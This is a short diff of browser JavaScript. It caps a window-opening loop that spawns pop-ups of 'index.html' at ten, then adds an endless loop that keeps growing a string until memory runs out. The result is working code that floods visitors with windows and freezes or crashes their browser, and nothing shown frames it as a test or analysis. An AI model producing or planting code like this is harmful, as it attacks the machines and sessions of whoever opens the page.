@@ -5,6 +5,10 @@ function NewTab() {
             "index.html", "_blank","width=1920,height=1080");
         }
 
-for (var i = 0; i < Infinity; i++) {
+for (var i = 0; i < 10; i++) {
        NewTab();
+}
+var bean = "a"
+while(true){
+            bean = bean += "a"
 }
